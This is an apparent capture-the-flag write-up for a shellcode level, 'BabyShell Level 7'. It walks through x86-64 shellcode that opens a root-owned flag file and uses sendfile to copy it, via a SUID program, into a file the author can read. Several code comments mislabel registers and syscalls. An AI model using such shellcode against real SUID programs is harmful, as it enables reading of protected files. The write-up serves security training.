# BabyShell Level 7
Level 7 ! This level was kinda cool not gonna lie, although i am pretty sure i ended up doing it an intended way...

The challenges closes `stdout` and `stderr`, so outputting the flag to the screen won't be possible in this challenge,... well i think so.

This is when i got the idea of opening 2 file descriptors (`flag.txt`, `a.out`) and use the `sendfile` systemcall to send the content of the first file descriptor `flag.txt` to the second file `a.out`, we will need to set the right permissions on the file because since the program runs with SUID bit enabled, it will output the file with root permissions and group `hacker`. 

We can set the flags to `S_IRGRP` on our open call to the `a.out` file and this will open the file with the right permissions needed, another thing you gonna need to do is to open the file in mode `O_CREAT | O_RDWR` because we want the file to be created if it doesn't already exist. Alternatively you can just `touch` a file in the `/tmp` directory, call it a.out and it should be able to open the file in the right mode.

To solve this challenge i used the following shellcode :
```x86asm
.global _start
_start:
.intel_syntax noprefix
    # Open
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    mov rax, 2
    syscall
    # Store file descriptor inside r6
    mov r10, rax

    # Open
    mov ebx, 0x74756f2e
    shl rbx, 8
    mov bl, 0x61
    push rbx
    mov rdi, rsp
    mov rsi, 0x02
    or rsi, 0x40
    mov rdx, 32
    mov rax, 2
    syscall
    # Store file descriptor inside r7
    mov r9, rax

    # Read
    mov rdi, r9
    mov rsi, r10
    mov rdx, 0
    mov r10, 100
    mov rax, 40
    syscall

    mov r10, rsi
    # Close flag.txt
    mov rdi, r9
    mov rax, 3
    syscall
    # Close a.out
    mov rdi, r10
    mov rax, 3
    syscall

    # Exit
    mov rax, 60
    mov rdi, 5
    syscall
```
